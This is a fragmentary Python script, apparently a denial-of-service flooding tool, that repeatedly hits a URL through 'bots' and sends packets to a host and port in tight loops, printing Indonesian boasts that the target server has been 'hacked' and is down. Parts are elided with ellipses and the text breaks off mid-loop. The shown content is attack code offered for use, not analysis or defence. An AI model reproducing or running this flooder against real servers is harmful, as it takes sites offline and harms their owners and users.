...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mLuthfi menabok bocah...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Luthfi menampol bocah!--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mBerhenti<->ah\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mServer Mati! di hacker sama luthfi\033[0m")
...
if __name__ == '__main__':
	...
	print("\033[94mLuthfi melakukan pengecekan sistem\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		...
		print("\033[91mKamu lupa? ingatin lagi mantan kamu!.. :v\033[0m")
		usage()
	while True:
